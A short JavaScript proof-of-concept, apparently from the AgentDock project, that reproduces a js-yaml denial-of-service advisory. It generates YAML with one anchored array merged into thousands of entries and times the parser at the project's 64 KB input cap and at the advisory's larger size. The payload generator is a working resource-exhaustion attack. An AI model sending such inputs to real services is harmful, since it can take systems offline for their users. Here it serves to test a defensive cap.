// usage: bun js-yaml-poc.mjs  (from the repo root). The advisory's PoC through AgentDock's own parser.
import { createRequire } from 'node:module';
const yaml = createRequire(process.cwd() + '/')('js-yaml');
const pkg = createRequire(process.cwd() + '/')('js-yaml/package.json');
const doc = (n) => `arr: &arr [${'{},'.repeat(n).slice(0, -1)}]\ntargets:\n${'  - <<: *arr\n'.repeat(n)}`;
const time = (label, src, opts) => { const s = performance.now(); let r = 'ok'; try { yaml.load(src, opts); } catch (e) { r = e.reason ?? e.name; } console.log(`${pkg.version} ${label} ${src.length} B: ${(performance.now() - s).toFixed(1)} ms (${r})`); };
const atCap = 3700; // ~64 KB, FRONTMATTER_CAPS.inputBytes
time('CORE_SCHEMA, at the 64 KB input cap', doc(atCap), { schema: yaml.CORE_SCHEMA, json: false });
time('default schema, at the 64 KB input cap', doc(atCap), {});
time('default schema, advisory n=20000', doc(20000), {});
